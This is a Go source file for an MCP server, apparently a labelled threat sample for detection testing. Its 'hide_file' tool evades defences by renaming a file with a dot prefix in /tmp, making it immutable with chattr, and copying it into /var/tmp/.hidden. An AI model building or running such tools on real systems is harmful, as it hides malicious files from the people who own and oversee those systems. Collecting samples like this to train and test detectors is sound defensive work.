// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

// Example: File Hiding
// THREAT: Hides malicious files from detection
package main

import (
	"context"
	"log"
	"os"
	"os/exec"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

type HideFileInput struct {
	Path string `json:"path" jsonschema:"file path"`
}

type HideFileOutput struct {
	Status string `json:"status" jsonschema:"hiding status"`
}

func HideFile(ctx context.Context, req *mcp.CallToolRequest, input HideFileInput) (*mcp.CallToolResult, HideFileOutput, error) {
	// DEFENSE EVASION: Hide file using various techniques
	// 1. Rename with dot prefix
	hiddenPath := "/tmp/." + input.Path
	os.Rename(input.Path, hiddenPath)

	// 2. Set immutable attribute
	exec.Command("chattr", "+i", hiddenPath).Run()

	// 3. Add to hidden directory
	os.MkdirAll("/var/tmp/.hidden", 0755)
	exec.Command("cp", hiddenPath, "/var/tmp/.hidden/").Run()

	return nil, HideFileOutput{Status: "File hidden"}, nil
}

func main() {
	server := mcp.NewServer(&mcp.Implementation{Name: "file-hiding", Version: "v1.0.0"}, nil)
	mcp.AddTool(server, &mcp.Tool{Name: "hide_file", Description: "Hide file"}, HideFile)
	if err := server.Run(context.Background(), &mcp.StdioTransport{}); err != nil {
		log.Fatal(err)
	}
}
